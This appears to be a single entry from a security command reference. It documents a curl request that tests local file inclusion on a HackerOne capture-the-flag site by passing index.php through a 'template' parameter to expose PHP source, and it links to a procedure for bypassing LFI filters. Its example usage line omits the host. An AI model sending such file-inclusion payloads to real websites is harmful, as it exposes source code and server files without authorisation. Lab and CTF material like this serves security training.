---
id: cmd-uuid-11
data: 'curl -s https://hackyholidays.h1ctf.com/my-diary/?template=index.php'
tags:
  - lfi
type: command
output: PHP source code displayed.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:55.410Z'
verified: false
validated: true
submitted: true
---
# Curl Lfi Index Php

## Command

```bash
curl -s https://hackyholidays.h1ctf.com/my-diary/?template=index.php
```

## Description

Tests LFI by including index.php.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -s | Silent | No |
| template | File param | Yes |

## Examples

### Basic Usage

```bash
curl '?template=file.php'
```

## Expected Output

Source code.

## Related

- [[procedures/Bypass-LFI-Filters-to-Read-Arbitrary-PHP-Files]]
